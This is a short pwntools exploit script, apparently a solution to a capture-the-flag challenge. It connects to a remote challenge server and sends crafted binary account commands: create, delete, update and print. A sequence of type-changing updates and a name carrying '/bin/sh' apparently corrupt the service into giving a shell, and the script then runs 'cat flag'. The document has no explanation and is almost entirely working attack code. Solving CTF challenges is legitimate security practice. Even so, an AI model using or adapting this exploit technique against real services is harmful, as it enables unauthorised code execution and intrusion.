from pwn import *

remote = connect("cddc2025-challs-nlb-579269aea83cde66.elb.ap-southeast-1.amazonaws.com", 7777)

def create_account(type, name):
    code = b'\x00'
    type = b'\x00' if type == 0 else b'\x01'
    name = name.encode()
    instruction = code + type + name
    remote.send(instruction)
    print(output())

def delete_account(id=0):
    code = b'\x01'
    id = id.to_bytes(1, 'little')
    instruction = code + id
    remote.send(instruction)
    print(output())

def update_account(type, name, id=0):
    code = b'\x02'
    id = id.to_bytes(1, 'little')
    type = b'\x00' if type == 0 else b'\x01'
    name = name.encode()
    instruction = code + id + type + name
    remote.send(instruction)
    print(output())

def print_account(id=0):
    code = b'\x03'
    id = id.to_bytes(1, 'little')
    instruction = code + id
    remote.send(instruction)
    print(output())

def print_banner():
    remote.send(b"\xff")
    print(output())

def output():
    return remote.clean(timeout=0.5)


create_account(1, "AA")
create_account(1, "BB")
print_banner()
update_account(0, "AA", id=0)
update_account(1, "AAA", id=0)
update_account(1, "BBB/bin/sh\x00", id=1)
print_banner()

remote.sendline(b"cat flag")
print(output().decode())
